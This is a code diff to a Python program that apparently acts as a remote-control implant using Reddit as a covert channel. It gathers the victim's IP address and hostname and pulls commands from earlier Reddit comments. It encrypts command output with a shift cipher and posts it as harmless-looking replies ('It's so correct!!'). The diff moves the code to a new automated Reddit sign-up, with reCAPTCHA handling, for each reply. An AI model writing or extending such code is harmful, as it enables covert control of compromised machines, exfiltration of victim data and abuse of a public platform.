@@ -98,21 +98,14 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
 
         try:
             if not os.path.isfile("config.json"):
-                self.sign_up_to_reddit()
-                login = "{},{},{}".format(self.login_email, self.login_username, self.login_password)
-                dictionary = {"login": login, "prev_comments": [], "rpDoneTasks": []}
-                json_object = json.dumps(dictionary, indent=3)
-
+                dictionary = {}
+                json_object = json.dumps(dictionary)
                 with open("config.json", "w") as outfile:
                     outfile.write(json_object)
 
             else:
                 with open('config.json', 'r') as openfile:
                     dictionary = json.load(openfile)
-                login_data = dictionary["login"].split(",")
-                self.login_email = login_data[0]
-                self.login_username = login_data[1]
-                self.login_password = login_data[2]
 
                 try:
                     self.prev_comments = dictionary["prev_comments"]
@@ -125,7 +118,6 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
             print(e)
 
     def start(self):
-
         if os.path.isfile("config.json"):
             try:
                 data = self.prev_comments[-1][1]
@@ -141,63 +133,40 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         IPAddr = socket.gethostbyname(hostname)
         return "{}@{}".format(IPAddr, hostname)
 
-    def write_back(self, data, err, browser, commentURL):
-        # load the comment URL
-        browser.get(commentURL)
+    def write_back(self, data, err, commentURL):
+        # sign up to Reddit
+        browser = self.sign_up_to_reddit()
 
-        # get ID of the comment
-        id = commentURL.split("/")[len(commentURL.split("/")) - 2]
+        # load the comment url
+        browser.get(commentURL)
 
         time.sleep(8)
 
-        # reply of the comment
+        # get id from comment url
+        id = commentURL.split("/")[len(commentURL.split("/")) - 2]
+
+        # click on "reply" of the comment
         WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, f'//*[@id="t1_{id}"]/div[2]/div[3]/div[3]/div[2]/button[1]'))).click()
 
-        time.sleep(2)
+        time.sleep(8)
 
         # insert to data to the reply
         if len(self.victimInfo) == 0:
             self.victimInfo = self.get_victim_info()
         enc = "{} {} {}".format(data, err, self.victimInfo)
         enc = shift_encrypt(enc, 16)
-        replyData = """It's so correct!!
-    send you big like XOXO
-    {}""".format(enc)
+        replyData = f"It's so correct!! {enc}"
 
-        reply = browser.find_element_by_xpath('//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div'.format(id))
+        reply = browser.find_element_by_xpath(f'//*[@id="t1_{id}"]/div[2]/div[3]/div[4]/div/div/div/div[2]/div/div[1]/div/div/div')
         reply.send_keys(replyData)
 
         time.sleep(2)
 
         # click on reply of the comment
-        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'//*[@id="t1_{}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'.format(id)))).click()
-        # login to the system
-        loginIframe = browser.find_element_by_css_selector("#SHORTCUT_FOCUSABLE_DIV > div:nth-child(6) > div > div > iframe")
-
-        # switch to the "reCAPTCHA" iframe context
-        browser.switch_to.frame(loginIframe)
-
-        # click on login
-        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/div[4]/a'))).click()
-
-        time.sleep(5)
-
-        # fill the user info for login
-        username = browser.find_element_by_xpath('//*[@id="loginUsername"]')
-        username.send_keys(self.login_username)
-
-        time.sleep(3)
-
-        password = browser.find_element_by_xpath('//*[@id="loginPassword"]')
-        password.send_keys(self.login_password)
-
-        time.sleep(3)
-
-        # click on log in
-        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH,'/html/body/div/main/div[1]/div/div/form/fieldset[4]/button'))).click()
+        WebDriverWait(browser, 20, 1).until(EC.element_to_be_clickable((By.XPATH, f'//*[@id="t1_{id}"]/div[2]/div[3]/div[4]/div/div/div/div[3]/div[1]/button[1]'))).click()
 
         time.sleep(4)
-
+        browser.quit()
 
     def command_handle(self, cmd, parameters, browser=None, dataToSave="", commentURL=""):
         result = hashlib.md5(dataToSave.encode('utf_8')).hexdigest()
@@ -351,6 +320,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         browser = webdriver.Chrome(options=parameters,executable_path=PATH)
         browser.maximize_window()
         tempCommentsList = copy.deepcopy(self.prev_comments)
+
         for prev_comment in reversed(self.prev_comments):
             # load the web page corresponding to the given url
             browser.get(prev_comment[0])
@@ -397,6 +367,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         browser.quit()
         self.prev_comments = tempCommentsList
         status, next_keys = self.get_next_command(self.bootstrap[0], self.bootstrap[1], self.bootstrap[2], self.bootstrap[3])
+
         return status, next_keys
 
     def sign_up_to_reddit(self):
@@ -445,7 +416,7 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
 
         time.sleep(2)
         pass_field.send_keys(Keys.ENTER)
-        time.sleep(3)
+        time.sleep(10)
 
         iframeReCAPTCHA = driver.find_element(By.CSS_SELECTOR,"#g-recaptcha > div > div > iframe")
 
@@ -499,4 +470,5 @@ R9ZFVLiX1VQS7vVicd1q2hbnRfspNFqN/N4+2uVyXndwKJkPkSlO5A==
         WebDriverWait(driver, 20, 1).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/main/div[2]/div/div/fieldset/button'))).click()
 
         time.sleep(3)
-        driver.quit()
+
+        return driver
